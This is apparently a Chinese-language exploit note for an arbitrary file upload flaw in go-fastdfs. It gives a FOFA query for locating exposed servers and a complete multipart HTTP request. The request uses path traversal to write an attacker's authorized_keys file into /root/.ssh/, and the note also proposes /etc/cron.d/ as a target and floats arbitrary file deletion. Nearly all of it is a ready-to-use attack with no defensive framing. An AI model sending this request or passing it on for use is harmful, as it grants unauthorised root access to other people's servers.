# go-fastdfs任意文件上传

fofa：title="go-fastdfs"

任意文件上传：

path为上传目录、filename为文件名；因为是go语言写的若没有其他环境（php、jsp等），建议上传到/root/.ssh/或/etc/cron.d/（任意文件名）下

```http
POST /group1/upload HTTP/1.1
Host: host
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: identity
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Length: 863
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarys4AUPXBA7t0PfSEx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36


------WebKitFormBoundarys4AUPXBA7t0PfSEx
Content-Disposition: form-data; name="file"; filename="authorized_keys"
Content-Type: application/octet-stream


ssh-rsa  root@VM-4-17-ubuntu


------WebKitFormBoundarys4AUPXBA7t0PfSEx
Content-Disposition: form-data; name="scene"


default
------WebKitFormBoundarys4AUPXBA7t0PfSEx
Content-Disposition: form-data; name="filename"


authorized_keys
------WebKitFormBoundarys4AUPXBA7t0PfSEx
Content-Disposition: form-data; name="output"


json
------WebKitFormBoundarys4AUPXBA7t0PfSEx
Content-Disposition: form-data; name="path"


../../../../../../../../../../root/.ssh/
------WebKitFormBoundarys4AUPXBA7t0PfSEx
Content-Disposition: form-data; name="code"



------WebKitFormBoundarys4AUPXBA7t0PfSEx
Content-Disposition: form-data; name="auth_token"



------WebKitFormBoundarys4AUPXBA7t0PfSEx
Content-Disposition: form-data; name="submit"


upload
------WebKitFormBoundarys4AUPXBA7t0PfSEx--
```

任意文件删除应该也可以办到，上传数据库到数据库文件夹下，利用md5与路径绑定删除，删除文件参数过滤了"."
